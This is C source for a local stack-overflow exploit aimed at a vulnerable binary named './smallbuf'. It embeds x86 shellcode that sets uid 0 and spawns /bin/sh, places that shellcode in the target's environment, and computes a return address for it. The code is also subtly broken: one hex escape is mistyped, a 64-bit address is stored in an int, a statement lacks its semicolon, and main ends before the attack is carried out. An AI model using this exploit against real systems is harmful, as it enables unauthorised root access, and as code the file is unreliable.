#include<stdlib.h> 
#include<stdio.h>
#include<unistd.h>
#include<string.h>

 #define VULN "./smallbuf" 

 #define SIZE 26


/* the following format is used
&shellcode (eip) - must point to the shellcode address
argc - not really using the contents here
shellcode 
./smallbuf*/

char shellcode[] = 
                "\xff\xff\xff\xff\xff\xff\xff\xff"
                "\x31\xc0\x31\xdb\xbo\x17\xcd\x80" //setuid 0 first
      "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"      
      "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
      "\x80\xe8\xdc\xff\xff\xff/bin/sh";

      int main(int argc , char **argv){
            // injection buffer
            char p[SIZE];
            //put the shellcode in target's envp
            char *env[] = { shellcode , NULL};
            int *ptr , i , addr , addr_argc , addr_eip;
            //calculate the exact location of shellcode
            //addr = (int) &shellcode;
            addr = 0x7ffffffffffa - strlen(shellcode) - strlen(VULN);
            addr += 4;
            addr_argc = addr;
            addr_eip = addr_argc + 4;
            fprintf(stderr , "[****] using fake argc addr")



      }